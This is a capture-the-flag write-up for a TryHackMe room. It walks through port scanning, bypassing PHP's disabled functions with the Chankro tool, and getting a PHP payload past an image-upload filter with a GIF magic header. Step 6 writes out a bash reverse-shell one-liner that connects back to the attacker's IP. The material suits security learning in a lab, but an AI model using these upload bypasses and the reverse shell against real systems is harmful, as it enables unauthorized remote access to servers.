Below is a concise, detailed note summarizing the key steps and commands used in the "Bypass Disable Functions" challenge on Try Hack Me:

1. Initial Port Scanning with Nmap

  • Command Options:
    • p- scans all 65,536 ports.
    • n disables DNS resolution for speed.
    • T5 sets an aggressive, fast scan timing.
    • v enables verbose output.
    • -open filters to show only open ports.
    • oG saves output in a grep-friendly format.
  • Purpose: Identify available services (ports 22 and 80 were found).

2. Service & Version Enumeration

  • Command Options:
    • sC runs default scripts for basic enumeration.
    • sV detects versions of the services running.
  • Purpose: Gather information about running services, though in this challenge, the results led to further web enumeration.

3. Web Enumeration & PHP Info

  • Observation: The web server on port 80 displays a file upload feature and a phpinfo.php page.
  • Key Detail: The phpinfo output revealed that critical functions (like exec, system, shell_exec, etc.) are disabled, limiting direct command execution.

4. Bypassing Disabled Functions with Chankro

  • Tool Insight:
    • Chankro leverages the PHP mail() function combined with putenv() to modify environment variables, allowing execution of commands through the sendmail binary.
  • Process:
    • Create a bash script (e.g., command.sh) with your desired command (initially, whoami to test execution).
    • Use Chankro with parameters:
      • -arch 64 for the correct architecture.
      • -input command.sh (your script file).
      • -output winsad.php (PHP file to be created).
      • -path [target web directory] (path where the PHP file should reside).

5. Bypassing File Upload Validation

  • Technique:
    • The file upload only accepts images. To bypass this, prepend your PHP payload with the GIF magic header (GIF89a;), making the file appear as a valid GIF image while still executing PHP code.
  • Outcome:
    • The modified PHP file (winsad.php) is accepted and can be executed to run the commands from your command.sh.

6. Gaining System Access

  • Steps:
    • After confirming command execution by checking the output file (e.g., winsad.txt containing the result of whoami), modify command.sh to launch a reverse shell:
      #!/bin/bash
bash -c 'bash -i >& /dev/tcp/[Your IP]/443 0>&1'
    • Regenerate winsad.php with Chankro (again, add the GIF89a; header) and upload it.
    • When accessed, this PHP file triggers the reverse shell connection to your listener, giving you access to the system.

7. Final Objective

  • Once you gain shell access, navigate the file system (e.g., into the target user's directory) to locate and read the flag.
